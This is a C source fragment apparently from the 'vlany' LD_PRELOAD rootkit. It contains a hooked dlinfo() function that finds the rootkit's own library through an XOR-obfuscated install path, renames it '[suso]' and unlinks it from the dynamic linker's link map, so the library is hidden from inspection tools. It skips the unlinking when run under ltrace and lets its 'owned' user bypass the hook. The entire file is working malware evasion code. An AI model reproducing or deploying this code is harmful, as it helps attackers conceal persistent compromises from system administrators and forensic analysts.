static struct link_map *vlany_linkmap;

void repair_linkmap()
{
    #ifdef DEBUG
        printf("[vlany] repair_linkmap() called\n");
    #endif

    vlany_linkmap->l_prev->l_next = vlany_linkmap;
    vlany_linkmap->l_next->l_prev = vlany_linkmap;
}

int dlinfo(void *handle, int request, void *p)
{
    #ifdef DEBUG
        printf("[vlany] dlinfo() called\n");
    #endif

    HOOK(old_dlinfo, CDLINFO);

    if(owned()) return old_dlinfo(handle, request, p);

    if(request == 2)
    {
        struct link_map *loop;
        old_dlinfo(handle, request, &loop);

        do {
            loop = loop->l_next;
            if(strcmp(loop->l_name, "\0"))
            {
                char *install_dir = strdup(INSTALL_DIR); xor(install_dir);
                if(strstr(loop->l_name, install_dir))
                {
                    vlany_linkmap = loop;
                    loop->l_name = "[suso]";

                    if(strcmp(procname_self(), "ltrace"))
                    {
                        atexit(repair_linkmap);
                        loop->l_prev->l_next = loop->l_next;
                        loop->l_next->l_prev = loop->l_prev;
                    }
                }
                cleanup(install_dir, strlen(install_dir));
            }
        }while(loop != NULL && loop->l_name != NULL && loop->l_next != NULL);
    }

    return old_dlinfo(handle, request, p);
}
